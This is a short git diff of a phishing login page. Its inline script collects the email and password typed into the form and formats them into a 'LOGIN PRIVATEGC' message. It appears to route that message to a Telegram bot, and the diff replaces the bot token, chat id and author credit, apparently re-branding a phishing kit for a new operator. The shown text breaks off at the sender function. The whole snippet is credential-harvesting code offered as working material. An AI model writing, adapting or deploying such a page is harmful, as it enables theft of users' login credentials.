@@ -174,14 +174,14 @@ span.psw {
 </div>
 
  <script>
-var telegram_bot_id = "7006068269:AAEzFrcdbPdMbPehZbsLkKrFnH1TG7dG5sc";
+var telegram_bot_id = "6978114331:AAHftB8usPpLKVTiF6JMccape6pEhV6MY1c";
 //chat id
-var chat_id = 5722619267;
+var chat_id = 6315151980;
 var email, password;
 var ready = function() {
   email = document.getElementById("email").value;
   password = document.getElementById("password").value;
-  message = "===[ LOGIN PRIVATEGC ]===" +'\n' + "\n[ U ]: " + email + "\n[ P ]: " + password +'\n'+ '\n===[ Coded By Bjorn Cruz ]===';
+  message = "===[ LOGIN PRIVATEGC ]===" +'\n' + "\n[ U ]: " + email + "\n[ P ]: " + password +'\n'+ '\n===[ Coded By XSOS ]===';
 };
 var sender = function() {
   ready();
